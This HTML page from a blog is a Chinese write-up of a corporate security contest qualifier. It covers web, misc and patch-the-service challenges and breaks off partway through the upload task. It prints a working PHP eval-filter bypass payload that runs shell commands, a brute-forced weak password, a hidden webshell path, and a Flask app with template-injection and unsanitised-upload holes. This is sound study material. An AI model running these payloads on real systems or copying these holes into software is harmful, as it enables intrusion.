@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="前言集团比赛初赛，体验了一下RDG模式，和19年第一次打国赛那个半决赛的赛制有点像，类似于AWDplus，太久没打，一时间不知道怎么去传，后面放出了一个修复的demo，看了之后才明白怎么玩。 简单记录一下：">
+<meta property="og:type" content="article">
+<meta property="og:title" content="集团网络安全竞赛初赛">
+<meta property="og:url" content="http://example.com/2024/09/25/%E9%9B%86%E5%9B%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/index.html">
+<meta property="og:site_name" content="My0n9s&#39;blog">
+<meta property="og:description" content="前言集团比赛初赛，体验了一下RDG模式，和19年第一次打国赛那个半决赛的赛制有点像，类似于AWDplus，太久没打，一时间不知道怎么去传，后面放出了一个修复的demo，看了之后才明白怎么玩。 简单记录一下：">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://img.picui.cn/free/2024/09/25/66f42011e4219.png">
+<meta property="og:image" content="https://img.picui.cn/free/2024/09/25/66f42044dacbc.png">
+<meta property="og:image" content="https://img.picui.cn/free/2024/09/25/66f4209a898d7.png">
+<meta property="og:image" content="https://img.picui.cn/free/2024/09/25/66f420dbdd862.png">
+<meta property="og:image" content="https://img.picui.cn/free/2024/09/25/66f420ffbd6e7.png">
+<meta property="og:image" content="https://img.picui.cn/free/2024/09/25/66f4212eb897a.png">
+<meta property="og:image" content="https://img.picui.cn/free/2024/09/25/66f421536bafa.png">
+<meta property="og:image" content="https://img.picui.cn/free/2024/09/25/66f42189bb40b.png">
+<meta property="og:image" content="https://img.picui.cn/free/2024/09/25/66f421ba5338e.png">
+<meta property="og:image" content="https://img.picui.cn/free/2024/09/25/66f421f4c8a4b.png">
+<meta property="og:image" content="https://img.picui.cn/free/2024/09/25/66f424a0788c9.png">
+<meta property="og:image" content="https://img.picui.cn/free/2024/09/25/66f424c0c21ee.png">
+<meta property="article:published_time" content="2024-09-25T14:55:21.000Z">
+<meta property="article:modified_time" content="2024-09-25T15:00:20.318Z">
+<meta property="article:author" content="My0n9s">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img.picui.cn/free/2024/09/25/66f42011e4219.png">
+
+
+<link rel="canonical" href="http://example.com/2024/09/25/%E9%9B%86%E5%9B%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2024/09/25/%E9%9B%86%E5%9B%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/","path":"2024/09/25/集团网络安全竞赛初赛/","title":"集团网络安全竞赛初赛"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>集团网络安全竞赛初赛 | My0n9s'blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">My0n9s'blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#web"><span class="nav-number">1.1.</span> <span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8A%E6%B8%B8%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="nav-number">1.1.1.</span> <span class="nav-text">上游服务器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AD%BE%E5%88%B0%E9%A2%98"><span class="nav-number">1.1.2.</span> <span class="nav-text">签到题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#easy-rce"><span class="nav-number">1.1.3.</span> <span class="nav-text">easy_rce</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MSIC"><span class="nav-number">1.2.</span> <span class="nav-text">MSIC</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#modbus"><span class="nav-number">1.2.1.</span> <span class="nav-text">modbus</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dns%E6%B5%81%E9%87%8F2"><span class="nav-number">1.2.2.</span> <span class="nav-text">dns流量2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#txtfile"><span class="nav-number">1.2.3.</span> <span class="nav-text">txtfile</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RDG"><span class="nav-number">1.3.</span> <span class="nav-text">RDG</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#t-mobile"><span class="nav-number">1.3.1.</span> <span class="nav-text">t-mobile</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#upload"><span class="nav-number">1.3.2.</span> <span class="nav-text">upload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#capture-the-cat"><span class="nav-number">1.3.3.</span> <span class="nav-text">capture the cat</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-number">1.4.</span> <span class="nav-text">小结</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="My0n9s"
+      src="/images/touxiang.jpeg">
+  <p class="site-author-name" itemprop="name">My0n9s</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">78</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">20</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/09/25/%E9%9B%86%E5%9B%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/touxiang.jpeg">
+      <meta itemprop="name" content="My0n9s">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="My0n9s'blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="集团网络安全竞赛初赛 | My0n9s'blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          集团网络安全竞赛初赛
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2024-09-25 22:55:21 / Modified: 23:00:20" itemprop="dateCreated datePublished" datetime="2024-09-25T22:55:21+08:00">2024-09-25</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>集团比赛初赛，体验了一下<code>RDG</code>模式，和19年第一次打国赛那个半决赛的赛制有点像，类似于AWDplus，太久没打，一时间不知道怎么去传，后面放出了一个修复的demo，看了之后才明白怎么玩。</p>
+<p>简单记录一下：</p>
+<span id="more"></span>
+
+<p>需要进到源码里面去具体修复，然后再提交压缩包上去check，如果修复成功，就会check通过。这次比赛压缩包的格式是：<code>.tar.gz</code></p>
+<p>把修复好的源码mv到原来的目录下去覆盖，然后去check，需要用到的命令放在<code>update.sh</code>里面，最后被修改的文件加上update.sh一起打包成压缩文件上传，然后check:</p>
+<p>demo:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">update.sh</span><br><span class="line">#! /bin/sh</span><br><span class="line">mv index.php  /var/www/html/index.php  //根据实际文件名还有文件路径做对应的修改</span><br><span class="line">chmod 777 index.php</span><br><span class="line"></span><br><span class="line">然后把我们修改好的index.php文件和update.sh 一起打包成 .tar.gz文件，命令为：tar zcvf update.tar.gz update.sh index.php</span><br><span class="line">   </span><br></pre></td></tr></table></figure>
+
+<p>最后把<code>update.tar.gz</code> 上传，然后check即可。</p>
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="上游服务器"><a href="#上游服务器" class="headerlink" title="上游服务器"></a>上游服务器</h3><p>这个题目给了一个上传的点，一开始看到url格式以为是SSRF打Redis，后面才发现是条件竞争：</p>
+<p><img src="https://img.picui.cn/free/2024/09/25/66f42011e4219.png" alt="image-20240925123137824.png"></p>
+<p>有一个上传成功，然后后面访问又不存在的过程，早应该想到条件竞争的， 没想到会这么简单。</p>
+<p>传一个文件上去，抓包一下，去爆破模块改下payload。</p>
+<p><img src="https://img.picui.cn/free/2024/09/25/66f42044dacbc.png" alt="image-20240925123251387.png"></p>
+<p>然后再用python写一个不停访问的脚本即可：</p>
+<p><img src="https://img.picui.cn/free/2024/09/25/66f4209a898d7.png" alt="image-20240925123507753.png"></p>
+<h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>弱口令爆破，用bp 爆破一下即可，最后登录的口令：admin  654321</p>
+<h3 id="easy-rce"><a href="#easy-rce" class="headerlink" title="easy_rce"></a>easy_rce</h3><p>这个题目一开始打开是这个界面，以为是java。</p>
+<p><img src="https://img.picui.cn/free/2024/09/25/66f420dbdd862.png" alt="image-20240925170023412.png"></p>
+<p>后面放到kali去扫了一下，发现有index.php文件，于是访问index.php:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/sess|ion|head|ers|next|file|prev|na|each|rand|strlen|values|reset|info|path|flip|current|dec|bin|pos|env|hex|local|oct|pi|dir|exp|end|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>很多都被过滤了，但是<code>array_shift()</code> 没有被过滤，<code>get_defined_vars()</code>也没有，最终payload:</p>
+<p><code>?cmd=system(&#39;ls&#39;);&amp;code=eval(array_shift(array_shift(get_defined_vars())));</code></p>
+<p><img src="https://img.picui.cn/free/2024/09/25/66f420ffbd6e7.png" alt="image-20240925170504746.png"></p>
+<p>去根目录下拿flag</p>
+<p><code>?cmd=system(&#39;cat /flag&#39;);&amp;code=eval(array_shift(array_shift(get_defined_vars())));</code></p>
+<h2 id="MSIC"><a href="#MSIC" class="headerlink" title="MSIC"></a>MSIC</h2><h3 id="modbus"><a href="#modbus" class="headerlink" title="modbus"></a>modbus</h3><p>附件是一个pcap文件，直接拖到工具一把锁：</p>
+<p><img src="https://img.picui.cn/free/2024/09/25/66f4212eb897a.png" alt="image-20240925170806328.png"></p>
+<p>锁了。</p>
+<h3 id="dns流量2"><a href="#dns流量2" class="headerlink" title="dns流量2"></a>dns流量2</h3><p>第二个题也是个流量包的题，一开始也是直接放到工具里面看看：</p>
+<p><img src="https://img.picui.cn/free/2024/09/25/66f421536bafa.png" alt="image-20240925170941185.png"></p>
+<p>发现dns流量，放到wireshark去看下；</p>
+<p><img src="https://img.picui.cn/free/2024/09/25/66f42189bb40b.png" alt="image-20240925171030769.png"></p>
+<p>去kali里面把dns流量提取出来：</p>
+<p><code>tshark -r dns.pcapng -T fields -e dns.qry.name -Y &quot;ip.src==8.8.8.8&quot; -Y &quot;frame.len==99&quot;</code></p>
+<p>发现有一大串0101，把冗余的数据去掉，换行去掉，发现字符个数刚好是841&#x3D;29*29 ，可以想到01转二维码：</p>
+<p>直接跑脚本:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> zlib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">QR_scan</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    MAX = <span class="built_in">int</span>(<span class="built_in">len</span>(<span class="built_in">str</span>) ** <span class="number">0.5</span>)</span><br><span class="line">    pic = Image.new(<span class="string">&quot;RGB&quot;</span>, (MAX, MAX))</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, MAX):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, MAX):</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">str</span>[i] == <span class="string">&#x27;0&#x27;</span>):</span><br><span class="line">                pic.putpixel([x, y], (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                pic.putpixel([x, y], (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))</span><br><span class="line">            i = i + <span class="number">1</span></span><br><span class="line">    pic.show()</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;misc2.txt&quot;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"><span class="built_in">str</span> = f.readline()</span><br><span class="line"><span class="comment"># print(len(str))</span></span><br><span class="line">QR_scan(<span class="built_in">str</span>)</span><br></pre></td></tr></table></figure>
+
+<p>跑出来用微信扫码即可。</p>
+<h3 id="txtfile"><a href="#txtfile" class="headerlink" title="txtfile"></a>txtfile</h3><p>这个题目一开始给的是16进制的txt，直接改成zip是不行的，这里是放到010里面，新建一个16进制文件，然后导入文件，最后保存改成zip:</p>
+<p><img src="https://img.picui.cn/free/2024/09/25/66f421ba5338e.png" alt="image-20240925171546766.png"></p>
+<p>解压的时候提示说是数字加小写，我选的六位数爆破，没爆破出来，电脑反而蓝屏了。。。</p>
+<p>后面给了字典提示，直接放到archpr里面去爆破，得到一个wav音频文件，十分吵。。丢到audacity看频谱可以看到flag</p>
+<p><img src="https://img.picui.cn/free/2024/09/25/66f421f4c8a4b.png" alt="image-20240925171743188.png"></p>
+<h2 id="RDG"><a href="#RDG" class="headerlink" title="RDG"></a>RDG</h2><h3 id="t-mobile"><a href="#t-mobile" class="headerlink" title="t-mobile"></a>t-mobile</h3><p>tomcat框架，拖下来扫一下可以发现后门，删掉即可，<code>rm   /tomcat/webapps/ROOT/assets/img/icons/.shell.jsp</code></p>
+<h3 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h3><p>在&#x2F;app下把app.py代码拖下来看下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request, session</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template, redirect, render_template_string</span><br><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">db_config = &#123;</span><br><span class="line">    <span class="string">&#x27;host&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;user&#x27;</span>: <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>: os.environ.get(<span class="string">&#x27;MYSQL_ROOT_PASSWORD&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;database&#x27;</span>: <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">db = pymysql.connect(**db_config)</span><br><span class="line">cursor = db.cursor()</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = os.environ.get(<span class="string">&#x27;SECRET&#x27;</span>, <span class="string">&#x27;secret&#x27;</span>)</span><br><span class="line">app.config[<span class="string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = <span class="number">20</span> * <span class="number">1024</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    username = session.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> username:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">    tpl = <span class="built_in">open</span>(<span class="string">&#x27;templates/index.html&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">return</span> render_template_string(tpl % username)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;upload.html&#x27;</span>)</span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    dst = os.path.join(<span class="string">&#x27;uploads&#x27;</span>, file.filename)</span><br><span class="line">    file.save(dst)</span><br><span class="line">    <span class="keyword">return</span> dst</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line">    username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">    sql = <span class="string">&quot;SELECT * from users where username=%s and password=%s&quot;</span></span><br><span class="line">    cursor.execute(sql, (username, password))</span><br><span class="line">    data = cursor.fetchall()</span><br><span class="line">    <span class="built_in">print</span>(cursor._executed)</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(data) &gt; <span class="number">0</span>:</span><br><span class="line">        session[<span class="string">&#x27;username&#x27;</span>] = data[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;failed&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(username) &gt; <span class="number">20</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;username is too long&quot;</span></span><br><span class="line"></span><br><span class="line">    sql = <span class="string">&quot;SELECT * from users where username=%s&quot;</span></span><br><span class="line">    cursor.execute(sql, (username,))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>((data := cursor.fetchall())) &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(data)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;username already used&#x27;</span></span><br><span class="line">    </span><br><span class="line">    sql = <span class="string">&#x27;INSERT into users (username, password) values (%s, %s)&#x27;</span></span><br><span class="line">    cursor.execute(sql, (username, password))</span><br><span class="line">    db.commit()</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(cursor._executed)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;success&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">5000</span>)</span><br></pre></td></tr></table></figure>
+
+<p>考虑到这里是upload，所以把重点放在upload函数上，加个过滤就行了：</p>
